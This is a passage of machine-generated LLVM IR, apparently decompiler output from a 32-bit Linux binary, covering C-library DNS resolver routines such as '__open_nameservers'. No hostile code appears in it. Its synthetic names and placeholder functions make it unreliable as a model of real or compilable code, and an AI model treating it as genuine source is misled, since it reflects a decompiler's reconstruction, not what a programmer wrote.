  store i32 %v0_804c408, i32* %v1_804c3f8, align 4
  %v2_804c409 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804beac)
  store i32 %v2_804c409, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c54a

dec_label_pc_804c413:                             ; preds = %dec_label_pc_804c34d
  %v1_804c416 = inttoptr i32 %v0_804c34d to i32*
  %v2_804c416 = load i32, i32* %v1_804c416, align 4
  %v5_804c416 = inttoptr i32 %v0_804c33d to i32*
  store i32 %v2_804c416, i32* %v5_804c416, align 4
  %v1_804c418 = call i32 @free(i32 -1)
  store i32 %v1_804c418, i32* @eax, align 4
  %v0_804c41d = load i32, i32* @esp, align 4
  %v1_804c41d = add i32 %v0_804c41d, 16
  br label %dec_label_pc_804c420

dec_label_pc_804c420:                             ; preds = %dec_label_pc_804c152, %dec_label_pc_804c27d, %dec_label_pc_804c275, %dec_label_pc_804c211, %dec_label_pc_804c197, %dec_label_pc_804c173, %dec_label_pc_804c413
  %v1_804c427 = phi i32 [ %v1_804c167, %dec_label_pc_804c152 ], [ %v1_804c26e, %dec_label_pc_804c27d ], [ %v1_804c26e, %dec_label_pc_804c275 ], [ %v1_804c188, %dec_label_pc_804c211 ], [ %v1_804c188, %dec_label_pc_804c197 ], [ %v1_804c188, %dec_label_pc_804c173 ], [ %v1_804c41d, %dec_label_pc_804c413 ]
  %v1_804c420 = add i32 %v1_804c427, 51
  %v2_804c420 = inttoptr i32 %v1_804c420 to i8*
  %v3_804c420 = load i8, i8* %v2_804c420, align 1
  %v4_804c420 = icmp eq i8 %v3_804c420, 0
  %v1_804c425 = icmp eq i1 %v4_804c420, false
  br i1 %v1_804c425, label %dec_label_pc_804c46b, label %dec_label_pc_804c427

dec_label_pc_804c427:                             ; preds = %dec_label_pc_804c420
  %v0_804c427 = load i32, i32* @ecx, align 4
  %v2_804c427 = add i32 %v1_804c427, -4
  %v3_804c427 = inttoptr i32 %v2_804c427 to i32*
  store i32 %v0_804c427, i32* %v3_804c427, align 4
  %v1_804c428 = add i32 %v1_804c427, -8
  %v2_804c428 = inttoptr i32 %v1_804c428 to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v2_804c428, align 4
  %v1_804c42d = add i32 %v1_804c427, -12
  %v2_804c42d = inttoptr i32 %v1_804c42d to i32*
  store i32 134526427, i32* %v2_804c42d, align 4
  %v1_804c432 = add i32 %v1_804c427, 184
  store i32 %v1_804c432, i32* @esi, align 4
  %v2_804c439 = add i32 %v1_804c427, -16
  %v3_804c439 = inttoptr i32 %v2_804c439 to i32*
  store i32 %v1_804c432, i32* %v3_804c439, align 4
  %v2_804c43a = call i32 @__pthread_return_void(i32 -1, i32 %v15_804beac)
  store i32 %v2_804c43a, i32* %eax.global-to-local, align 4
  %v0_804c43f = load i32, i32* @esp, align 4
  %v1_804c43f = inttoptr i32 %v0_804c43f to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v1_804c43f, align 4
  %v1_804c446 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804c446, i32* %eax.global-to-local, align 4
  %v0_804c44b = load i32, i32* @esp, align 4
  %v1_804c44b = inttoptr i32 %v0_804c44b to i32*
  %v2_804c44b = load i32, i32* %v1_804c44b, align 4
  store i32 %v2_804c44b, i32* @eax, align 4
  %v3_804c44b = add i32 %v0_804c44b, 4
  %v1_804c44c = inttoptr i32 %v3_804c44b to i32*
  %v2_804c44c = load i32, i32* %v1_804c44c, align 4
  store i32 %v2_804c44c, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_804c44c, align 4
  %v0_804c44f = load i32, i32* @esi, align 4
  store i32 %v0_804c44f, i32* %v1_804c44b, align 4
  %v0_804c450 = load i32, i32* @global_var_8054998.87, align 8
  store i32 %v0_804c450, i32* %ebx.global-to-local, align 4
  %v2_804c456 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804beac)
  store i32 %v2_804c456, i32* %eax.global-to-local, align 4
  %v0_804c45b = load i32, i32* @esp, align 4
  %v1_804c45b = add i32 %v0_804c45b, 16
  %v1_804c45e = add i32 %v0_804c450, -1
  store i32 %v1_804c45e, i32* @ebx, align 4
  %v1_804c45f = add i32 %v0_804c45b, 52
  %v2_804c45f = inttoptr i32 %v1_804c45f to i32*
  %v3_804c45f = load i32, i32* %v2_804c45f, align 4
  %v5_804c45f = sub i32 %v3_804c45f, %v1_804c45e
  %v11_804c45f = xor i32 %v3_804c45f, %v1_804c45e
  %v12_804c45f = xor i32 %v5_804c45f, %v3_804c45f
  %v13_804c45f = and i32 %v12_804c45f, %v11_804c45f
  %v14_804c45f = icmp slt i32 %v13_804c45f, 0
  %v16_804c45f = icmp slt i32 %v5_804c45f, 0
  %v2_804c463 = icmp eq i1 %v16_804c45f, %v14_804c45f
  br i1 %v2_804c463, label %dec_label_pc_804c46b, label %dec_label_pc_804c465

dec_label_pc_804c465:                             ; preds = %dec_label_pc_804c427
  %v4_804c465 = add i32 %v3_804c45f, 1
  store i32 %v4_804c465, i32* %v2_804c45f, align 4
  br label %dec_label_pc_804c48c.backedge

dec_label_pc_804c46b:                             ; preds = %dec_label_pc_804c0f4, %dec_label_pc_804c427, %dec_label_pc_804c420, %dec_label_pc_804c10b
  %v1_804c478 = phi i32 [ %v1_804c45b, %dec_label_pc_804c427 ], [ %v1_804c427, %dec_label_pc_804c420 ], [ %v1_804c147, %dec_label_pc_804c10b ], [ %v0_804c46b.pre, %dec_label_pc_804c0f4 ]
  %v1_804c46b = add i32 %v1_804c478, 40
  %v2_804c46b = inttoptr i32 %v1_804c46b to i32*
  %v3_804c46b = load i32, i32* %v2_804c46b, align 4
  %v1_804c46f = add i32 %v3_804c46b, 1
  store i32 %v1_804c46f, i32* %eax.global-to-local, align 4
  %v1_804c470 = ashr i32 %v1_804c46f, 31
  store i32 %v1_804c470, i32* %edx.global-to-local, align 4
  %v1_804c471 = add i32 %v1_804c478, 248
  %v2_804c471 = inttoptr i32 %v1_804c471 to i32*
  %v3_804c471 = load i32, i32* %v2_804c471, align 4
  %v5_804c471 = zext i32 %v1_804c46f to i64
  %v7_804c471 = zext i32 %v1_804c470 to i64
  %v8_804c471 = mul nuw i64 %v7_804c471, 4294967296
  %v9_804c471 = or i64 %v8_804c471, %v5_804c471
  %v10_804c471 = zext i32 %v3_804c471 to i64
  %v11_804c471 = sdiv i64 %v9_804c471, %v10_804c471
  %v12_804c471 = trunc i64 %v11_804c471 to i32
  store i32 %v12_804c471, i32* %eax.global-to-local, align 4
  %v13_804c471 = srem i64 %v9_804c471, %v10_804c471
  %v14_804c471 = trunc i64 %v13_804c471 to i32
  store i32 %v14_804c471, i32* %edx.global-to-local, align 4
  store i32 %v14_804c471, i32* %v2_804c46b, align 4
  %v1_804c47c = icmp eq i32 %v14_804c471, 0
  %v1_804c47e = icmp eq i1 %v1_804c47c, false
  br i1 %v1_804c47e, label %dec_label_pc_804c484, label %dec_label_pc_804c480

dec_label_pc_804c480:                             ; preds = %dec_label_pc_804c46b
  %v0_804c480 = load i32, i32* @esp, align 4
  %v1_804c480 = add i32 %v0_804c480, 28
  %v2_804c480 = inttoptr i32 %v1_804c480 to i32*
  %v3_804c480 = load i32, i32* %v2_804c480, align 4
  %v4_804c480 = add i32 %v3_804c480, 1
  store i32 %v4_804c480, i32* %v2_804c480, align 4
  br label %dec_label_pc_804c484

dec_label_pc_804c484:                             ; preds = %dec_label_pc_804c46b, %dec_label_pc_804c480
  %v0_804c484 = load i32, i32* @esp, align 4
  %v1_804c484 = add i32 %v0_804c484, 36
  %v2_804c484 = inttoptr i32 %v1_804c484 to i32*
  store i32 -1, i32* %v2_804c484, align 4
  br label %dec_label_pc_804c48c.backedge

dec_label_pc_804c48c.backedge:                    ; preds = %dec_label_pc_804c484, %dec_label_pc_804c102, %dec_label_pc_804c1f0, %dec_label_pc_804c465
  %v0_804c48c.pre = load i32, i32* @esp, align 4
  %v1_804c48c = add i32 %v0_804c48c.pre, 28
  %v2_804c48c = inttoptr i32 %v1_804c48c to i32*
  %v3_804c48c = load i32, i32* %v2_804c48c, align 4
  %tmp120 = icmp ult i32 %v3_804c48c, 3
  br i1 %tmp120, label %dec_label_pc_804beec, label %dec_label_pc_804c4b1

dec_label_pc_804c4b1:                             ; preds = %dec_label_pc_804be66, %dec_label_pc_804bf02, %dec_label_pc_804bff6, %dec_label_pc_804c48c.backedge, %entry, %dec_label_pc_804be40, %dec_label_pc_804be48, %dec_label_pc_804be56
  %stack_var_-192.0 = phi i16 [ -1, %dec_label_pc_804be56 ], [ -1, %dec_label_pc_804be48 ], [ -1, %dec_label_pc_804be40 ], [ -1, %entry ], [ %v0_804beb3, %dec_label_pc_804c48c.backedge ], [ %v0_804beb3, %dec_label_pc_804bff6 ], [ %v0_804beb3, %dec_label_pc_804bf02 ], [ %v0_804beb3, %dec_label_pc_804be66 ]
  %v0_804c4b1 = call i32 @__GI___h_errno_location()
  store i32 %v0_804c4b1, i32* %eax.global-to-local, align 4
  %v1_804c4b6 = inttoptr i32 %v0_804c4b1 to i32*
  store i32 -1, i32* %v1_804c4b6, align 4
  %v0_804c4bc = load i32, i32* @esp, align 4
  %v1_804c4bc = add i32 %v0_804c4bc, 44
  %v2_804c4bc = inttoptr i32 %v1_804c4bc to i32*
  %v3_804c4bc = load i32, i32* %v2_804c4bc, align 4
  store i32 %v3_804c4bc, i32* %eax.global-to-local, align 4
  %v2_804c4c0 = add i32 %v0_804c4bc, 56
  %v3_804c4c0 = inttoptr i32 %v2_804c4c0 to i32*
  store i32 %v3_804c4bc, i32* %v3_804c4c0, align 4
  br label %dec_label_pc_804c4c4

dec_label_pc_804c4c4:                             ; preds = %dec_label_pc_804c229, %dec_label_pc_804c201, %dec_label_pc_804c4b1
  %stack_var_-192.1 = phi i16 [ %stack_var_-192.0, %dec_label_pc_804c4b1 ], [ %v0_804beb3, %dec_label_pc_804c229 ], [ %v0_804beb3, %dec_label_pc_804c201 ]
  %v0_804c4c4 = load i32, i32* @esp, align 4
  %v1_804c4c4 = add i32 %v0_804c4c4, 20
  %v2_804c4c4 = inttoptr i32 %v1_804c4c4 to i32*
  %v3_804c4c4 = load i32, i32* %v2_804c4c4, align 4
  %v13_804c4c4 = icmp eq i32 %v3_804c4c4, -1
  br i1 %v13_804c4c4, label %dec_label_pc_804c4c4.dec_label_pc_804c4da_crit_edge, label %dec_label_pc_804c4cb

dec_label_pc_804c4c4.dec_label_pc_804c4da_crit_edge: ; preds = %dec_label_pc_804c4c4
  %.pre = sext i16 %stack_var_-192.1 to i32
  br label %dec_label_pc_804c4da

dec_label_pc_804c4cb:                             ; preds = %dec_label_pc_804c4c4
  %v3_804c4ce = load i32, i32* %v2_804c4c4, align 4
  %v5_804c4ce = add i32 %v0_804c4c4, -16
  %v6_804c4ce = inttoptr i32 %v5_804c4ce to i32*
  store i32 %v3_804c4ce, i32* %v6_804c4ce, align 4
  %v1_804c4d2 = sext i16 %stack_var_-192.1 to i32
  %v2_804c4d2 = call i32 @__libc_close(i32 %v1_804c4d2)
  store i32 %v2_804c4d2, i32* %eax.global-to-local, align 4
  %v0_804c4d7 = load i32, i32* @esp, align 4
  %v1_804c4d7 = add i32 %v0_804c4d7, 16
  br label %dec_label_pc_804c4da

dec_label_pc_804c4da:                             ; preds = %dec_label_pc_804c4c4.dec_label_pc_804c4da_crit_edge, %dec_label_pc_804c4cb
  %v1_804c4e1.pre-phi = phi i32 [ %.pre, %dec_label_pc_804c4c4.dec_label_pc_804c4da_crit_edge ], [ %v1_804c4d2, %dec_label_pc_804c4cb ]
  %v0_804c4da = phi i32 [ %v0_804c4c4, %dec_label_pc_804c4c4.dec_label_pc_804c4da_crit_edge ], [ %v1_804c4d7, %dec_label_pc_804c4cb ]
  %v1_804c4dd = add i32 %v0_804c4da, 12
  %v2_804c4dd = inttoptr i32 %v1_804c4dd to i32*
  %v3_804c4dd = load i32, i32* %v2_804c4dd, align 4
  %v5_804c4dd = add i32 %v0_804c4da, -16
  %v6_804c4dd = inttoptr i32 %v5_804c4dd to i32*
  store i32 %v3_804c4dd, i32* %v6_804c4dd, align 4
  %v2_804c4e1 = call i32 @free(i32 %v1_804c4e1.pre-phi)
  store i32 %v2_804c4e1, i32* %eax.global-to-local, align 4
  %v1_804c4e6 = load i32, i32* @esp, align 4
  %v2_804c4e6 = inttoptr i32 %v1_804c4e6 to i32*
  store i32 %v2_804be1e, i32* %v2_804c4e6, align 4
  %v2_804c4e9 = call i32 @free(i32 %v1_804c4e1.pre-phi)
  store i32 %v2_804c4e9, i32* @eax, align 4
  %v0_804c4ee = load i32, i32* @esp, align 4
  %v1_804c4f1 = add i32 %v0_804c4ee, 32
  %v2_804c4f1 = inttoptr i32 %v1_804c4f1 to i32*
  store i32 -1, i32* %v2_804c4f1, align 4
  %v0_804c4f9 = load i32, i32* @esp, align 4
  %v1_804c4f9 = add i32 %v0_804c4f9, 40
  %v2_804c4f9 = inttoptr i32 %v1_804c4f9 to i32*
  %v3_804c4f9 = load i32, i32* %v2_804c4f9, align 4
  %v13_804c4f9 = icmp eq i32 %v3_804c4f9, -1
  br i1 %v13_804c4f9, label %dec_label_pc_804c54d, label %dec_label_pc_804c500

dec_label_pc_804c500:                             ; preds = %dec_label_pc_804c4da
  %v0_804c500 = load i32, i32* @ecx, align 4
  %v2_804c500 = add i32 %v0_804c4f9, -4
  %v3_804c500 = inttoptr i32 %v2_804c500 to i32*
  store i32 %v0_804c500, i32* %v3_804c500, align 4
  %v1_804c501 = add i32 %v0_804c4f9, -8
  %v2_804c501 = inttoptr i32 %v1_804c501 to i32*
  store i32 ptrtoint (i8** @global_var_8052528.84 to i32), i32* %v2_804c501, align 4
  %v1_804c506 = add i32 %v0_804c4f9, -12
  %v2_804c506 = inttoptr i32 %v1_804c506 to i32*
  store i32 134526427, i32* %v2_804c506, align 4
  %v1_804c50b = add i32 %v0_804c4f9, 184
  store i32 %v1_804c50b, i32* %ebx.global-to-local, align 4
  %v2_804c512 = add i32 %v0_804c4f9, -16
  %v3_804c512 = inttoptr i32 %v2_804c512 to i32*
  store i32 %v1_804c50b, i32* %v3_804c512, align 4
  %v3_804c513 = call i32 @__pthread_return_void(i32 %v1_804c4e1.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804c513, i32* %eax.global-to-local, align 4
  %v0_804c518 = load i32, i32* @esp, align 4
  %v1_804c518 = inttoptr i32 %v0_804c518 to i32*
  store i32 ptrtoint (i8** @global_var_8052528.84 to i32), i32* %v1_804c518, align 4
  %v2_804c51f = call i32 @__pthread_return_0(i32 %v1_804c4e1.pre-phi)
  store i32 %v2_804c51f, i32* %eax.global-to-local, align 4
  %v0_804c524 = load i32, i32* @esp, align 4
  %v1_804c524 = add i32 %v0_804c524, 56
  %v2_804c524 = inttoptr i32 %v1_804c524 to i32*
  %v3_804c524 = load i32, i32* %v2_804c524, align 4
  store i32 %v3_804c524, i32* %edx.global-to-local, align 4
  %v1_804c528 = add i32 %v0_804c524, 72
  %v2_804c528 = inttoptr i32 %v1_804c528 to i32*
  %v3_804c528 = load i32, i32* %v2_804c528, align 4
  store i32 %v3_804c528, i32* %eax.global-to-local, align 4
  %v1_804c52c = sext i32 %v3_804c524 to i64
  store i64 %v1_804c52c, i64* @global_var_8052540.85, align 64
  %v1_804c532 = trunc i32 %v3_804c528 to i16
  store i16 %v1_804c532, i16* @global_var_805215c.86, align 4
  %v1_804c538 = inttoptr i32 %v0_804c524 to i32*
  %v2_804c538 = load i32, i32* %v1_804c538, align 4
  store i32 %v2_804c538, i32* @eax, align 4
  %v3_804c538 = add i32 %v0_804c524, 4
  %v1_804c539 = inttoptr i32 %v3_804c538 to i32*
  %v2_804c539 = load i32, i32* %v1_804c539, align 4
  store i32 %v2_804c539, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_804c539, align 4
  %v0_804c53c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804c53c, i32* %v1_804c538, align 4
  %v3_804c53d = call i32 @__pthread_return_void(i32 %v1_804c4e1.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804c53d, i32* %eax.global-to-local, align 4
  %v0_804c542 = load i32, i32* @esp, align 4
  %v1_804c542 = add i32 %v0_804c542, 32
  %v2_804c542 = inttoptr i32 %v1_804c542 to i32*
  store i32 -1, i32* %v2_804c542, align 4
  br label %dec_label_pc_804c54a

dec_label_pc_804c54a:                             ; preds = %dec_label_pc_804c3be, %dec_label_pc_804c500
  %v0_804c54a = load i32, i32* @esp, align 4
  %v1_804c54a = add i32 %v0_804c54a, 16
  br label %dec_label_pc_804c54d

dec_label_pc_804c54d:                             ; preds = %dec_label_pc_804c4da, %dec_label_pc_804c54a
  %v0_804c54d = phi i32 [ %v0_804c4f9, %dec_label_pc_804c4da ], [ %v1_804c54a, %dec_label_pc_804c54a ]
  %v1_804c54d = add i32 %v0_804c54d, 16
  %v2_804c54d = inttoptr i32 %v1_804c54d to i32*
  %v3_804c54d = load i32, i32* %v2_804c54d, align 4
  store i32 %v3_804c54d, i32* %eax.global-to-local, align 4
  %v1_804c551 = add i32 %v0_804c54d, 220
  %v1_804c557 = inttoptr i32 %v1_804c551 to i32*
  %v2_804c557 = load i32, i32* %v1_804c557, align 4
  store i32 %v2_804c557, i32* @ebx, align 4
  %v3_804c557 = add i32 %v0_804c54d, 224
  %v1_804c558 = inttoptr i32 %v3_804c557 to i32*
  %v2_804c558 = load i32, i32* %v1_804c558, align 4
  store i32 %v2_804c558, i32* @esi, align 4
  %v3_804c558 = add i32 %v0_804c54d, 228
  %v1_804c559 = inttoptr i32 %v3_804c558 to i32*
  %v2_804c559 = load i32, i32* %v1_804c559, align 4
  store i32 %v2_804c559, i32* @edi, align 4
  %v3_804c559 = add i32 %v0_804c54d, 232
  %v1_804c55a = inttoptr i32 %v3_804c559 to i32*
  %v2_804c55a = load i32, i32* %v1_804c55a, align 4
  store i32 %v2_804c55a, i32* @ebp, align 4
  ret i32 %v3_804c54d

; uselistorder directives
  uselistorder i32 %v0_804c54d, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804c524, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804c4f9, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_804c4da, { 1, 0 }
  uselistorder i32 %v1_804c4e1.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-192.1, { 1, 0 }
  uselistorder i32 %v0_804c48c.pre, { 1, 0 }
  uselistorder i32 %v5_804c45f, { 1, 0 }
  uselistorder i32 %v3_804c45f, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804c427, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_804c3f0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804c3be, { 1, 0 }
  uselistorder i32 %v3_804c39d, { 1, 0, 2 }
  uselistorder i32 %v0_804c38e, { 1, 0 }
  uselistorder i32 %v5_804c384, { 1, 0 }
  uselistorder i32* %v3_804c384, { 1, 0 }
  uselistorder i32 %v0_804c25a81, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_804c384, { 2, 1, 0 }
  uselistorder i32 %v5_804c37e, { 1, 0 }
  uselistorder i32 %v1_804c37d, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804c379, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804c33d, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_804c317, { 1, 0 }
  uselistorder i32 %v1_804c308, { 1, 0 }
  uselistorder i32 %v0_804c2c7, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_804c26e, { 1, 2, 0 }
  uselistorder i32 %v0_804c26e, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_804c248, { 1, 0 }
  uselistorder i32 %v1_804c242, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804c23d, { 1, 2, 0 }
  uselistorder i32 %v5_804c24858, { 1, 0 }
  uselistorder i32 %v5_804c1ea, { 1, 0 }
  uselistorder i32 %v3_804c1ea, { 2, 0, 1, 3 }
  uselistorder i32 %v3_804c1a2, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804c188, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_804c188, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_804c167, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804c147, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804c0ed, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_804c0d2, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_804c0bb, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804c043, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804c030, { 3, 0, 1, 2 }
  uselistorder i32 %v1_804bff6, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804bfd7, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_804bfbb, { 1, 0 }
  uselistorder i32 %v3_804bfb0, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_804bfad, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_804bf52, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_804bf4d, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804bf36, { 1, 0 }
  uselistorder i32 %v1_804bf02, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804bef392, { 2, 1, 0 }
  uselistorder i32 %v3_804bf0b, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i16 %v0_804beb3, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32 %v15_804beac, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_804be1e, { 1, 8, 3, 10, 6, 2, 5, 9, 0, 4, 11, 7, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 78, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 66, 62, 63, 64, 65, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 80, 81, 82, 83, 84 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 27, { 1, 2, 0 }
  uselistorder i32 72, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 0 }
  uselistorder i32 10000, { 1, 0 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 2, 0 }
  uselistorder i32 (i32)* @inet_addr, { 1, 0 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 200, { 1, 0, 2, 3 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 2, 4, 0, 1, 5, 3 }
  uselistorder i16* @global_var_805215c.86, { 2, 1, 0 }
  uselistorder i64* @global_var_8052540.85, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8052528.84 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_8052528.84, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 4, 0, 1 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804c54d, { 1, 0 }
  uselistorder label %dec_label_pc_804c54a, { 1, 0 }
  uselistorder label %dec_label_pc_804c4da, { 1, 0 }
  uselistorder label %dec_label_pc_804c4c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c4b1, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_804c48c.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804c484, { 1, 0 }
  uselistorder label %dec_label_pc_804c46b, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804c420, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_804c3be, { 1, 0 }
  uselistorder label %dec_label_pc_804c38e, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_804c384, { 1, 0 }
  uselistorder label %dec_label_pc_804c379, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c376, { 1, 0 }
  uselistorder label %dec_label_pc_804c2f1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804c239, { 1, 0 }
  uselistorder label %dec_label_pc_804c0bb, { 1, 0 }
  uselistorder label %dec_label_pc_804c084, { 1, 0 }
  uselistorder label %dec_label_pc_804bff6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bf02, { 1, 0 }
  uselistorder label %dec_label_pc_804beec, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_804c55c = load i32, i32* @ebp, align 4
  store i32 134526427, i32* %stack_var_-216, align 4
  %v3_804c56b = ptrtoint i32* %stack_var_-216 to i32
  %v2_804c570 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804c570, i32* @eax, align 4
  %v2_804c578 = call i32 @__pthread_return_void(i32 %v2_804c570, i32 134526427)
  %v1_804c584 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052160.32 to i32))
  store i32 %v1_804c584, i32* @eax, align 4
  %v0_804c58c = load i32, i32* @global_var_8054994.33, align 4
  %tmp43 = icmp slt i32 %v0_804c58c, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_804c783, label %dec_label_pc_804c599

dec_label_pc_804c599:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_80505fe.89 to i32), i32* %stack_var_-216, align 4
  %v2_804c5a5 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_80505cc.90 to i32), i32 ptrtoint (i32* @global_var_80505fe.89 to i32))
  store i32 %v2_804c5a5, i32* @eax, align 4
  store i32 %v2_804c5a5, i32* @ebp, align 4
  %v1_804c5af = icmp eq i32 %v2_804c5a5, 0
  %v1_804c5b1 = icmp eq i1 %v1_804c5af, false
  br i1 %v1_804c5b1, label %dec_label_pc_804c74e.preheader, label %dec_label_pc_804c5b7

dec_label_pc_804c5b7:                             ; preds = %dec_label_pc_804c599
  store i32 ptrtoint (i32* @global_var_80505fe.89 to i32), i32* %stack_var_-216, align 4
  %v2_804c5c3 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_80505dd.91 to i32), i32 ptrtoint (i32* @global_var_80505fe.89 to i32))
  store i32 %v2_804c5c3, i32* @ebp, align 4
  %v1_804c5cd = icmp eq i32 %v2_804c5c3, 0
  %v1_804c5cf = icmp eq i1 %v1_804c5cd, false
  br i1 %v1_804c5cf, label %dec_label_pc_804c74e.preheader, label %dec_label_pc_804c778

dec_label_pc_804c74e.preheader:                   ; preds = %dec_label_pc_804c599, %dec_label_pc_804c5b7
  %v2_804c755 = ptrtoint i32* %stack_var_-180 to i32
  %v3_804c689 = add i32 %v3_804c56b, 164
  %v0_804c74e103 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_804c755, i32* @ebx, align 4
  %v3_804c75a104 = call i32 @fgets(i32 %v2_804c755, i32 128, i32 %v0_804c74e103)
  store i32 %v3_804c75a104, i32* @eax, align 4
  %v1_804c762105 = icmp eq i32 %v3_804c75a104, 0
  %v1_804c764106 = icmp eq i1 %v1_804c762105, false
  br i1 %v1_804c764106, label %dec_label_pc_804c5db.preheader.lr.ph, label %dec_label_pc_804c76a

dec_label_pc_804c5db.preheader.lr.ph:             ; preds = %dec_label_pc_804c74e.preheader
  %v4_804c673 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_804c5db.preheader

dec_label_pc_804c5da:                             ; preds = %dec_label_pc_804c5e5
  %v1_804c5da = add i32 %v0_804c5da57, 1
  store i32 %v1_804c5da, i32* @ebx, align 4
  %v1_804c5db = inttoptr i32 %v1_804c5da to i8*
  %v2_804c5db = load i8, i8* %v1_804c5db, align 1
  %v3_804c5db = zext i8 %v2_804c5db to i32
  %v5_804c5db = and i32 %v6_804c5db60, -256
  %v6_804c5db = or i32 %v3_804c5db, %v5_804c5db
  store i32 %v6_804c5db, i32* @ecx, align 4
  %v4_804c5dd = icmp eq i8 %v2_804c5db, 0
  br i1 %v4_804c5dd, label %dec_label_pc_804c74e.backedge, label %dec_label_pc_804c5e5

dec_label_pc_804c5e5:                             ; preds = %dec_label_pc_804c5e5.lr.ph, %dec_label_pc_804c5da
  %v6_804c5db60 = phi i32 [ %v6_804c5db55, %dec_label_pc_804c5e5.lr.ph ], [ %v6_804c5db, %dec_label_pc_804c5da ]
  %v2_804c5db59 = phi i8 [ %v2_804c5db52, %dec_label_pc_804c5e5.lr.ph ], [ %v2_804c5db, %dec_label_pc_804c5da ]
